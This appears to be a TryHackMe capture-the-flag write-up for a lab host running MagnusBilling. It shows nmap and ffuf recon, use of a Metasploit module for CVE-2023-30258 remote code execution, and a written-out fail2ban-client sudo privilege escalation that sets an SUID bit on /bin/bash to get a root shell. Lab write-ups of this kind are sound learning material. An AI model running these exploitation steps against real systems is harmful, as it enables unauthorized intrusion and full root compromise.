

## Enumeration

1. start off with our nmap scan `nmap -sV -sC -o nmap.txt 10.112.183.215` to do our initial recon
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-02 09:26 SAST
Nmap scan report for 10.112.183.215
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 92:d5:7a:72:42:18:57:60:54:ff:35:ea:f2:7d:71:55 (ECDSA)
|_  256 95:0f:da:02:25:cb:b8:89:57:0d:40:05:d7:46:ed:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.112.183.215/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
                                                                     
```


2. Directory scan `ffuf -u http://10.112.183.21/mbilling/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `
3. We see it's running Magnus Billing and find this exploit posted by [Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/) which has its on MSF module we can use `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`

## Task 1

2. I set our RHOSTS to the target IP, LHOSTs to tun0 for our THM vpn connection and run. 
3. Navigating to the home/magnus user directory we are able to find user.txt and get the user flag.

## Task 2

1. running our privilege escalation checks, there's nothing in crontab to exploit but running our sudo privilege checks reveals we can run this script as our user with no password - `/usr/bin/fail2ban-client`
2. After some googling I found this [article](https://juggernaut-sec.com/fail2ban-lpe/)on using fail2ban to elevate privileges and customised them to work for this lab
3.  I first checked the config directory for the tool with this command ` cd /etc/fail2ban && ls -l` and read the `jail.local` to extract the rules used to configure the tool and as the article states, this is where we will input our exploit code to obtain root.
4. To achieve this we also need to check what actions our current user can run using the fail2ban tool and this achieved by running the following commnad
```
asterisk@ip-10-112-183-215:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
<r/bin/fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
asterisk@ip-10-112-183-215:/$ 

```

5. Now we modify these actions using `sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'` to create an SUID in the /bin/bash directory which will result in us getting a root shell.
6. The next step is to just ban an IP to execute this rule and complete our exploit and we do this by `sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4`
7. once this is done, we simple run `/bin/bash -p` and you get root and can navigate to the root directory and cat out the final flag!